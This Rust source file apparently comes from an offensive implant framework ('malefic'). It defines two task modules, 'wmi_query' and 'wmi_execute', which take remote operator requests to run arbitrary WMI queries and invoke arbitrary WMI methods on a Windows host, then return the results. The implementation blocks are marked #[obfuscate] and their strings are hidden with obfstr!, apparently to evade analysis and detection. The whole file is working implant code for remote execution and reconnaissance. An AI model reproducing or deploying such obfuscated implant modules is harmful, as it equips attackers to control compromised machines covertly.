use std::collections::HashMap;

use async_trait::async_trait;
use malefic_os_win::wmi::exec::WmiExecParam;
use malefic_os_win::wmi::{COMLibrary, Variant, WMIConnection, WMIError};

use crate::prelude::*;

fn string_to_variant_map(input: HashMap<String, String>) -> HashMap<String, Variant> {
    input
        .into_iter()
        .map(|(key, value)| {
            let variant_value = if let Ok(int_value) = value.parse::<i32>() {
                Variant::I4(int_value)
            } else if let Ok(float_value) = value.parse::<f64>() {
                Variant::R8(float_value)
            } else {
                Variant::String(value)
            };
            (key, variant_value)
        })
        .collect()
}

fn variant_to_string_map(input: HashMap<String, Variant>) -> HashMap<String, String> {
    input
        .into_iter()
        .map(|(key, value)| {
            let string_value = match value {
                Variant::I4(i) => i.to_string(),
                Variant::UI4(u) => u.to_string(),
                Variant::R8(f) => f.to_string(),
                Variant::String(s) => s,
                Variant::Bool(b) => b.to_string(),
                Variant::Null => "null".to_string(),
                _ => {
                    format!("{:?}", value)
                }
            };
            (key, string_value)
        })
        .collect()
}

struct WmiManager {
    wmi_con: WMIConnection,
}

#[obfuscate]
impl WmiManager {
    fn open(namespace: Option<&str>) -> Result<Self, WMIError> {
        let com_con = COMLibrary::new()?;
        let namespace = namespace.unwrap_or("ROOT").to_string();
        let wmi_con = WMIConnection::with_namespace_path(&namespace, com_con)?;

        Ok(WmiManager { wmi_con })
    }

    fn execute_query(&self, query: &str) -> Result<Vec<HashMap<String, Variant>>, WMIError> {
        let enumerator = self.wmi_con.exec_query_native_wrapper(query)?;
        let mut results = Vec::new();
        for item in enumerator {
            let obj = match item {
                Ok(o) => o,
                Err(_) => continue,
            };
            let props = match obj.list_properties() {
                Ok(p) => p,
                Err(_) => continue,
            };
            let mut map = HashMap::new();
            for prop in props {
                if let Ok(val) = obj.get_property(&prop) {
                    map.insert(prop, val);
                }
            }
            results.push(map);
        }
        Ok(results)
    }

    fn execute_method(
        &self,
        class_name: &str,
        method_name: &str,
        params: HashMap<String, Variant>,
    ) -> Result<Vec<HashMap<String, Variant>>, WMIError> {
        let exec_params: Vec<WmiExecParam> = params
            .into_iter()
            .map(|(key, value)| WmiExecParam { key, value })
            .collect();
        let wrapper = self
            .wmi_con
            .exec_method(class_name, method_name, &exec_params);

        let mut converted_map = HashMap::new();
        match wrapper {
            Ok(Some(obj)) => {
                if let Ok(props) = obj.list_properties() {
                    for prop in props {
                        if let Ok(val) = obj.get_property(&prop) {
                            converted_map.insert(prop, val);
                        }
                    }
                }
            }
            Ok(None) => {
                converted_map.insert(obfstr!("ReturnValue").to_string(), Variant::I4(0));
            }
            Err(e) => {
                converted_map.insert(obfstr!("ReturnValue").to_string(), Variant::I4(1));
                converted_map.insert(
                    obfstr!("Error").to_string(),
                    Variant::String(format!("{:?}", e)),
                );
            }
        }
        Ok(vec![converted_map])
    }
}

pub struct WmiQuery {}

#[async_trait]
#[module_impl("wmi_query")]
impl Module for WmiQuery {}

#[async_trait]
#[obfuscate]
impl ModuleImpl for WmiQuery {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::WmiRequest)?;
        let cmdline = check_field!(req.args)?.join(" ");
        let manager = WmiManager::open(Some(req.namespace.as_str()))?;
        let results = manager.execute_query(&*cmdline)?;
        let mut kv_result = HashMap::new();
        for record in results {
            let string_map = variant_to_string_map(record);
            kv_result.extend(string_map);
        }

        Ok(TaskResult::new_with_body(
            id,
            Body::Response(Response {
                output: "".to_string(),
                error: String::new(),
                kv: kv_result,
                array: Vec::new(),
            }),
        ))
    }
}

pub struct WmiExecuteMethod {}

#[async_trait]
#[module_impl("wmi_execute")]
impl Module for WmiExecuteMethod {}

#[async_trait]
#[obfuscate]
impl ModuleImpl for WmiExecuteMethod {
    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
        let req = check_request!(receiver, Body::WmiMethodRequest)?;
        let class_name = check_field!(req.class_name)?;
        let method_name = check_field!(req.method_name)?;

        let manager = WmiManager::open(Some(req.namespace.as_str()))?;
        let results = manager.execute_method(
            class_name.as_str(),
            method_name.as_str(),
            string_to_variant_map(req.params),
        )?;
        let mut kv_result = HashMap::new();

        for record in results {
            let string_map = variant_to_string_map(record);
            for (key, value) in string_map {
                kv_result.insert(key.clone(), value.clone());
            }
        }

        Ok(TaskResult::new_with_body(
            id,
            Body::Response(Response {
                output: format!("Executed {}::{}", class_name, method_name),
                error: String::new(),
                kv: kv_result,
                array: Vec::new(),
            }),
        ))
    }
}
